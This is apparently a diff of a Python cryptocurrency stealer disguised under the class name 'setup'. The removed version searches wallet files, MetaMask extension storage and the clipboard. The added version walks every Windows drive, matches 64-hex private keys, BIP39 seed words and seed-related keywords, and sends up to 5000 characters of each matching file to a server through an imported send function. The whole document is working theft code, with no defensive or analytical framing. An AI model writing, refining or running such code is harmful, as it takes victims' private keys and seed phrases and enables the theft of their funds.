@@ -1,179 +1,167 @@
 import os
 import re
-import json
 import time
+import threading
 from pathlib import Path
 from export import send
+
+# File extensions to scan (text-based files only)
+SCAN_EXTENSIONS = {
+    '.txt', '.log', '.json', '.dat', '.bak', '.old', '.md', 
+    '.cfg', '.conf', '.ini', '.csv', '.xml', '.yml', '.yaml',
+    '.html', '.htm', '.js', '.py', '.java', '.c', '.cpp', '.h',
+    '.go', '.rs', '.ts', '.jsx', '.tsx', '.vue', '.php', '.rb',
+    '.sh', '.bash', '.zsh', '.fish', '.ps1', '.bat', '.cmd'
+}
+
+# BIP39 words for seed detection (first 100 for speed)
+BIP39_WORDS = {
+    'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract',
+    'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid',
+    'acoustic', 'acquire', 'across', 'act', 'action', 'actor', 'actress', 'actual',
+    'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult', 'advance',
+    'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent',
+    'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album',
+    'alert', 'alien', 'all', 'alley', 'allow', 'almost', 'alone', 'alpha',
+    'already', 'also', 'alter', 'always', 'amateur', 'amazing', 'among', 'amount',
+    'amused', 'analyst', 'anchor', 'ancient', 'anger', 'angle', 'angry', 'animal',
+    'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique', 'anxiety',
+    'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'arch',
+    'arctic', 'area', 'arena', 'argue', 'arm', 'armed', 'armor', 'army',
+}
+
+# Private key pattern
+PRIVATE_KEY_PATTERN = re.compile(r'(?:0x)?[a-fA-F0-9]{64}')
+SEED_WORD_PATTERN = re.compile(r'\b(?:' + '|'.join(BIP39_WORDS) + r')\b', re.IGNORECASE)
 
 class setup:
     def __init__(self):
         self.data = []
-        print("[DEBUG] Setup initialized")
+        self.files_scanned = 0
+        self.found_files = []
+        self._stop_scan = False
     
     def run(self):
-        print("[DEBUG] Scan started")
-        self._scan()
-        print(f"[DEBUG] Scan complete. Found: {len(self.data)} items")
-        if self.data:
+        print("[DEBUG] Full system scan started")
+        self._scan_full_system()
+        print(f"[DEBUG] Scan complete. Scanned: {self.files_scanned} files")
+        print(f"[DEBUG] Found: {len(self.found_files)} files with seeds/keys")
+        
+        if self.found_files:
+            # Add found files to data
+            for file_info in self.found_files:
+                self.data.append(file_info)
+            
             print("[DEBUG] Sending data to server...")
             send(self.data)
             print("[DEBUG] Data sent")
         else:
             print("[DEBUG] No data found, skipping send")
     
-    def _scan(self):
-        print("[DEBUG] Starting file scan...")
+    def _scan_full_system(self):
+        """Scan the entire file system for seed phrases and private keys."""
         
-        # ============================================
-        # SCAN 1: WALLET FILES (ANYWHERE)
-        # ============================================
-        print("[DEBUG] Scanning for wallet files...")
+        # Get all drives
+        drives = self._get_drives()
+        print(f"[DEBUG] Scanning drives: {drives}")
         
-        # Common wallet file names
-        wallet_files = [
-            "wallet.dat", "wallet.json", "seed.txt", "seedphrase.txt",
-            "mnemonic.txt", "privatekey.txt", "key.txt", "backup.txt",
-            "recovery.txt", "passphrase.txt", "metamask.txt", "trustwallet.txt",
-            "secrets.txt", "passwords.txt", "crypto.txt", "wallet_backup.txt",
-            "metamask_backup.txt", "seed_phrase.txt", "recovery_phrase.txt"
-        ]
-        
-        # Search locations (all common places)
-        search_paths = [
-            os.path.expanduser("~"),
-            os.path.expandvars("%APPDATA%"),
-            os.path.expandvars("%USERPROFILE%\\Desktop"),
-            os.path.expandvars("%USERPROFILE%\\Documents"),
-            os.path.expandvars("%USERPROFILE%\\Downloads"),
-            os.path.expandvars("%USERPROFILE%\\Pictures"),
-            os.path.expandvars("%USERPROFILE%\\Music"),
-            os.path.expandvars("%USERPROFILE%\\Videos"),
-            os.path.expandvars("%LOCALAPPDATA%"),
-            os.path.expandvars("%PROGRAMFILES%"),
-            os.path.expandvars("%PROGRAMFILES(x86)%"),
-            "C:\\",
-        ]
-        
-        found_files = []
-        
-        for search_path in search_paths:
-            if not os.path.exists(search_path):
-                continue
-            
-            print(f"[DEBUG] Searching: {search_path}")
-            try:
-                for root, dirs, files in os.walk(search_path):
-                    # Limit depth to avoid scanning entire drive
-                    depth = root.replace(search_path, '').count(os.sep)
-                    if depth > 4:
-                        continue
-                    
-                    for file in files:
-                        # Check if file matches wallet patterns
-                        file_lower = file.lower()
-                        if any(pattern in file_lower for pattern in wallet_files):
-                            file_path = os.path.join(root, file)
-                            try:
-                                with open(file_path, 'r', errors='ignore') as f:
-                                    content = f.read()
-                                    # Check if it looks like a seed phrase or private key
-                                    if self._looks_like_seed(content) or self._looks_like_key(content):
-                                        print(f"[DEBUG] Found wallet file: {file_path}")
-                                        found_files.append({
-                                            'type': 'file',
-                                            'path': file_path,
-                                            'content': content[:5000]
-                                        })
-                            except Exception as e:
-                                print(f"[DEBUG] Error reading {file_path}: {e}")
-            except Exception as e:
-                print(f"[DEBUG] Error walking {search_path}: {e}")
-        
-        self.data.extend(found_files)
-        print(f"[DEBUG] Found {len(found_files)} wallet files")
-        
-        # ============================================
-        # SCAN 2: METAMASK VAULT
-        # ============================================
-        print("[DEBUG] Scanning for MetaMask vaults...")
-        
-        metamask_paths = [
-            os.path.expandvars(r"%APPDATA%\Google\Chrome\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"),
-            os.path.expandvars(r"%APPDATA%\Google\Chrome\Profile*\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"),
-            os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles\*\storage\default\moz-extension+++*"),
-            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"),
-        ]
-        
-        for path_pattern in metamask_paths:
-            from glob import glob
-            for path in glob(path_pattern):
-                try:
-                    locker_file = os.path.join(path, "LOCK")
-                    if os.path.exists(locker_file):
-                        with open(locker_file, 'r', errors='ignore') as f:
-                            data = f.read()
-                            self.data.append({
-                                'type': 'metamask',
-                                'path': locker_file,
-                                'data': data[:10000]
-                            })
-                            print(f"[DEBUG] Found MetaMask vault: {locker_file}")
-                except Exception as e:
-                    print(f"[DEBUG] Error scanning {path_pattern}: {e}")
-        
-        # ============================================
-        # SCAN 3: CLIPBOARD
-        # ============================================
-        print("[DEBUG] Checking clipboard...")
+        # Scan each drive
+        for drive in drives:
+            print(f"[DEBUG] Scanning drive: {drive}")
+            self._scan_directory(drive)
+    
+    def _get_drives(self):
+        """Get all available drives on Windows."""
+        drives = []
+        for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
+            path = f"{letter}:\\"
+            if os.path.exists(path):
+                drives.append(path)
+        return drives
+    
+    def _scan_directory(self, directory):
+        """Scan a directory recursively."""
         try:
-            import pyperclip
-            clipboard_content = pyperclip.paste()
-            if clipboard_content:
-                if self._looks_like_key(clipboard_content) or self._looks_like_seed(clipboard_content):
-                    self.data.append({
-                        'type': 'clipboard',
-                        'content': clipboard_content
-                    })
-                    print(f"[DEBUG] Found key/seed in clipboard: {clipboard_content[:50]}...")
-                else:
-                    print("[DEBUG] No key/seed in clipboard")
-            else:
-                print("[DEBUG] Clipboard empty")
+            for root, dirs, files in os.walk(directory):
+                # Skip system folders (for speed)
+                skip_dirs = ['Windows', 'Program Files', 'Program Files (x86)', 
+                            'System32', 'System Volume Information', '$Recycle.Bin',
+                            'AppData\\Local\\Temp', 'AppData\\Local\\Microsoft\\Windows\\INetCache']
+                
+                # Filter out system directories
+                dirs[:] = [d for d in dirs if d not in skip_dirs and not d.startswith('$')]
+                
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    
+                    # Check file extension
+                    ext = os.path.splitext(file)[1].lower()
+                    
+                    # Skip binary files (exe, dll, images, videos, etc.)
+                    if ext in SCAN_EXTENSIONS or not ext or ext in ['.txt', '.log', '.json', '.dat', '.bak']:
+                        self._scan_file(file_path)
+                    
+                    # Progress update every 1000 files
+                    self.files_scanned += 1
+                    if self.files_scanned % 1000 == 0:
+                        print(f"[DEBUG] Scanned {self.files_scanned} files...")
+                        
         except Exception as e:
-            print(f"[DEBUG] Clipboard error: {e}")
-        
-        print(f"[DEBUG] Total items found: {len(self.data)}")
+            print(f"[DEBUG] Error scanning {directory}: {e}")
     
-    def _looks_like_seed(self, text):
-        """Check if text looks like a seed phrase."""
-        if not text or len(text) < 20:
-            return False
-        
-        # BIP39 words - just a sample for detection
-        bip39_words = {
-            'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract',
-            'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid',
-            'acoustic', 'acquire', 'across', 'act', 'action', 'actor', 'actress', 'actual',
-            'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult', 'advance',
-            'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent',
-            'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album'
-        }
-        
-        words = set(text.lower().split())
-        matches = words.intersection(bip39_words)
-        return len(matches) >= 6  # At least 6 BIP39 words
-    
-    def _looks_like_key(self, text):
-        """Check if text looks like a private key."""
-        if not text:
-            return False
-        
-        # Check for 0x + 64 hex chars
-        if re.search(r'0x[a-fA-F0-9]{64}', text):
-            return True
-        
-        # Check for 64 hex chars without 0x
-        if re.search(r'\b[a-fA-F0-9]{64}\b', text):
-            return True
-        
-        return False
+    def _scan_file(self, file_path):
+        """Scan a single file for seeds or private keys."""
+        try:
+            # Skip files larger than 10MB (performance)
+            if os.path.getsize(file_path) > 10 * 1024 * 1024:
+                return
+            
+            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                content = f.read(50000)  # Read first 50KB
+                
+                # Skip if file is empty or too short
+                if not content or len(content) < 20:
+                    return
+                
+                # Check for private keys (fast)
+                if PRIVATE_KEY_PATTERN.search(content):
+                    print(f"[DEBUG] Found private key in: {file_path}")
+                    self.found_files.append({
+                        'type': 'file',
+                        'path': file_path,
+                        'content': content[:5000]
+                    })
+                    return
+                
+                # Check for seed phrases (slower - check word count)
+                word_matches = SEED_WORD_PATTERN.findall(content.lower())
+                if len(word_matches) >= 6:
+                    # Check if there's a cluster of BIP39 words
+                    unique_words = set(word_matches)
+                    if len(unique_words) >= 6:
+                        print(f"[DEBUG] Found seed phrase in: {file_path}")
+                        self.found_files.append({
+                            'type': 'file',
+                            'path': file_path,
+                            'content': content[:5000]
+                        })
+                        return
+                
+                # Check for common seed-related keywords
+                seed_keywords = ['mnemonic', 'seed', 'recovery', 'phrase', 'private key', 
+                                'passphrase', 'wallet.dat', 'metamask', 'trustwallet']
+                
+                content_lower = content.lower()
+                if any(keyword in content_lower for keyword in seed_keywords):
+                    # If it has keywords and some BIP39 words, likely a seed file
+                    if len(word_matches) >= 4:
+                        print(f"[DEBUG] Found potential seed file: {file_path}")
+                        self.found_files.append({
+                            'type': 'file',
+                            'path': file_path,
+                            'content': content[:5000]
+                        })
+                        
+        except Exception as e:
+            # Silently skip files that can't be read
+            pass
